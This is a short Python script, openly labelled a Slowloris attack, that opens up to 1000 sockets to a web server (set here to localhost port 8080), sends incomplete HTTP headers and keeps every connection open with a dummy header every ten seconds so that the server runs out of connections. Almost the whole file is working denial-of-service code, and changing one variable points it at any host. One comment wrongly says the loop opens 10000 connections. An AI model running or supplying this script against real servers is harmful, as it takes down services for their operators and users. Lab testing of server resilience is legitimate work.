import socket
import time

host = "127.0.0.1"  # @ of the server
port = 8080        # HTTP port exposed 

sockets = []

print("[+] Starting Slowloris attack...")
for i in range(1000):  # attempt on openning 10000 connexions
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((host, port))
        s.send(b"GET / HTTP/1.1\r\n")
        s.send(f"Host: {host}\r\n".encode("utf-8"))
        sockets.append(s)
        print(f"[+] Socket {i+1} connected.")
    except Exception as e:
        print(f"[!] Failed to connect socket {i+1}: {e}")
        break
#keep the connexions open by sending headers each 10 seconds
while True:
    print("[+] Sending keep-alive headers...")
    for s in sockets:
        try:
            s.send(b"X-a: b\r\n")
        except:
            sockets.remove(s)
    time.sleep(10) 
